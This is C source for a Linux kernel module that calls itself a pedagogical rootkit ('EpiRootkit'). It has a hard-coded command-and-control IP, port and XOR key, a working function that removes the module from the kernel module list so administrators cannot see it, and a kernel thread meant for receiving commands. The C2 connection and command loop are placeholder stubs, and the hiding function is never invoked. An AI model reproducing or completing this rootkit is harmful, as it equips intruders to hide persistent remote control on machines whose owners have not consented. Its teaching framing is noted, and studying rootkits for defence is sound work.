#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/inet.h>
#include <net/sock.h>
#include <linux/list.h>
#include <linux/uio.h>
#include <linux/security.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.3");

static struct rootkit_config {
    unsigned short port;
    char server_ip[16];
    size_t buffer_size;
    char xor_key[32];
} config = {
    .port = 4242,
    .server_ip = "192.168.15.6",
    .buffer_size = 2048,
    .xor_key = "epirootkit"
};

static struct socket *g_sock = NULL;
static struct task_struct *g_thread = NULL;
static int connection_state = 0;
static unsigned long last_reconnect_attempt = 0;
#define RECONNECT_DELAY_MS 3000

static struct list_head *prev_module = NULL;

static void notify_connection_state(int new_state) {
    if (new_state != connection_state) {
        connection_state = new_state;
        if (connection_state)
            printk(KERN_INFO "epirootkit: Connected to C2 server\n");
        else
            printk(KERN_INFO "epirootkit: Disconnected from C2 server\n");
    }
}

static void hide_module(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    printk(KERN_INFO "epirootkit: Module hidden from list\n");
}

static void unhide_module(void) {
    if (prev_module) {
        list_add(&THIS_MODULE->list, prev_module);
        prev_module = NULL;
        printk(KERN_INFO "epirootkit: Module unhidden\n");
    }
}

// Implémentation minimale pour compilation
static int connect_to_c2_server(void) {
    pr_info("epirootkit: Dummy connect_to_c2_server called\n");
    return 0; // succès factice
}

// Implémentation minimale pour compilation
static int command_loop(void *data) {
    pr_info("epirootkit: Dummy command_loop started\n");
    while (!kthread_should_stop()) {
        ssleep(1);
    }
    pr_info("epirootkit: Dummy command_loop stopping\n");
    return 0;
}

static int __init epirootkit_init(void) {
    int err;

    pr_info("epirootkit: Initializing...\n");

    g_sock = NULL;
    g_thread = NULL;
    connection_state = 0;
    prev_module = NULL;

    err = connect_to_c2_server();
    if (err < 0) {
        pr_err("epirootkit: Failed to connect to C2 server\n");
        return err;
    }

    g_thread = kthread_run(command_loop, NULL, "rk");
    if (IS_ERR(g_thread)) {
        pr_err("epirootkit: Failed to create command thread\n");
        sock_release(g_sock);
        g_sock = NULL;
        return PTR_ERR(g_thread);
    }

    notify_connection_state(1);
    return 0;
}

static void __exit epirootkit_exit(void) {
    pr_info("epirootkit: Cleaning up module...\n");

    if (g_thread) {
        pr_info("epirootkit: Stopping thread...\n");
        kthread_stop(g_thread);
        g_thread = NULL;
    }

    if (g_sock) {
        pr_info("epirootkit: Closing socket...\n");
        sock_release(g_sock);
        g_sock = NULL;
        notify_connection_state(0);
    }

    if (prev_module && THIS_MODULE) {
        pr_info("epirootkit: Unhiding module...\n");
        list_add(&THIS_MODULE->list, prev_module);
        prev_module = NULL;
    }

    pr_info("epirootkit: Cleanup complete\n");
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);
